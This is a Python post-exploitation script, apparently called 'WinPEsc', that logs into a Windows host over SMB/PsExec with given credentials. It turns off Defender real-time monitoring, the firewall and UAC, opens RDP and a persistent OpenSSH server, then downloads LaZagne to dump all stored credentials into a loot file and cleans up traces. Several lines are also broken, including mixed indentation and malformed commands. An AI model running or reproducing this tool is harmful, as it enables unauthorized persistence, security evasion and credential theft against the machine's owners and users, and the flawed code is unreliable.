#!/usr/bin/env python3
from argparse import ArgumentParser
from pypsexec.client import Client,SMBResponseException
from colorama import Fore, Style

def get_args():
	parser = ArgumentParser(description="WinPEsc helps to maintain access to windows machine and have some other cool features like UAC Disable,Firewall Disable,Dumping Credentials,etc.",usage='python3 %(prog)s -t Target -u Username -P Password',epilog='Example: python3 %(prog)s 192.168.101.14 admin P@$$w0rd123')

	parser.add_argument('-t',dest='target',required=True,help='Target to Exploit')
	parser.add_argument('-u',dest='username',required=True,help='Username to login')
	parser.add_argument('-p',dest='password',required=True,help='Password for login')
	parser.add_argument('-v','--version',help='version of this program',action='version',version='%(prog)s 1.0')
	args = parser.parse_args()

	return args

args = get_args()

target = args.target
username = args.username
password = args.password
#print(target,username,password)


def color_print(string: str , color: str ):
	colors = {'red': Fore.RED,'blue': Fore.BLUE, 
	'green': Fore.GREEN,'yellow': Fore.YELLOW}
	
	print(Style.BRIGHT+colors[color]+string+Style.RESET_ALL)


try:
	client = Client(target,username=username,password=password,encrypt=False)
	client.connect()
	color_print('[+]Authentication Sucessfull','blue')

except ValueError:
	exit(color_print('[*]could not reach to target','red'))

except SMBResponseException:
	exit(color_print('[*]could not authenticate using provided credentials','red'))



try:
	client.create_service()

	stdout, stderr, rc = client.run_executable("powershell",arguments='/c Set-MpPreference - DisableRealtimeMonitoring $true')
	color_print('[+]RealTime Monitoring Disabled','green')


	stdout, stderr, rc = client.run_executable("powershell",arguments='/c NetSh Advfirewall set allprofiles state off')
	color_print('[+]Firewall Disabled','yellow')


	stdout, stderr, rc = client.run_executable("powershell",arguments='/c Set-ExecutionPolicy RemoteSigned -Force')
	color_print('[+]Powershell Execution Policy Bypassed','blue')

	

    stdout, stderr, rc = client.run_executable("reg.exe",
        arguments='ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
    color_print('[+]UAC Disabled','green')
    

    stdout, stderr, rc = client.run_executable("reg.exe",
        arguments='add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
    color_print('[+]RDP Enabled And Started','yellow')
    

    stdout, stderr, rc = client.run_executable("cmd",
        arguments='/c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes')
    color_print('[+]Firewall Configured For RDP','blue')
    

    stdout, stderr, rc = client.run_executable("powershell",
        arguments='/c Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0')
    color_print('[+]OpenSSH Server Installed','green')
    

    stdout, stderr, rc = client.run_executable("powershell",
        arguments='/c Start-service sshd')
    color_print('[+]OpenSSH Server Started','yellow')
    

    stdout, stderr, rc = client.run_executable("powershell",
        arguments="/c Set-Service -Name sshd -StartupType 'Automatic'")
    color_print('[+]OpenSSH Server Configured To Run At Startup','blue')
    

    stdout, stderr, rc = client.run_executable("powershell",
        arguments="/c Get-NetFirewallRule -Name *ssh*'Automatic'")
    color_print('[+]Firewall Configured For SSH Server','yellow')
    print(f"{Fore.RED}{Style.BRIGHT}[*]{Style.RESET_ALL} You Can Now Login Through SSH Or RDP With Username: {Fore.LIGHTGREEN_EX}{Style.BRIGHT}{username}{Style.RESET_ALL} And Password: {Fore.LIGHTGREEN_EX}{Style.BRIGHT}{password}{Style.RESET_ALL} Any Time")
    

    stdout, stderr, rc = client.run_executable("powershell",
        arguments="/c Invoke-WebRequest -Uri https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe -OutFile C:\\Windows\\Temp\\lazagne.exe")
    color_print('[!]Gathering All Possible Credentials This Could Take A While','blue')
    

    stdout, stderr, rc = client.run_executable("cmd",
        arguments='/c C:\\Windows\\Temp\\lazagne.exe all')
    file = open('loot.txt','w').write((stdout.decode())[505:])
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} All Gathered Credentials Written To loot.txt")
    
    stdout, stderr, rc = client.run_executable("cmd",
        arguments='/c del C:\\Windows\\Temp\\lazagne.exe')
    print('[+]Everything Cleaned Up','red')
    
    client.remove_service()
    client.disconnect()

except KeyboardInterrupt:
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Cleaning Up")
    try:
        client.cleanup()
    except SMBResponseException:
        pass
    exit(f"{Fore.RED}{Style.BRIGHT}[-]{Style.RESET_ALL} User Interrupted")

except:
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Cleaning Up")
    try:
        client.cleanup()
    except SMBResponseException:
        pass
    except:
        raise
